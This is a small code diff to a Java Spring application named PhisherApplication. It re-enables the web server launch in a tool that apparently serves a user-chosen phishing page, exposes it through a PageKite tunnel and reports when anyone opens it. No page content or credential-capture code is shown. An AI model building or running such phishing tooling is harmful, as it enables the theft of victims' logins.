@@ -27,7 +27,7 @@ public class PhisherApplication {
         }
 
         Operations.writeActiveFile(Constants.options.get(choice - 1));
-//        SpringApplication.run(PhisherApplication.class, args);
+        SpringApplication.run(PhisherApplication.class, args);
 
         System.out.println("\n\nWill notify here if anyone opens your page\n");
         Command.executePageKite();
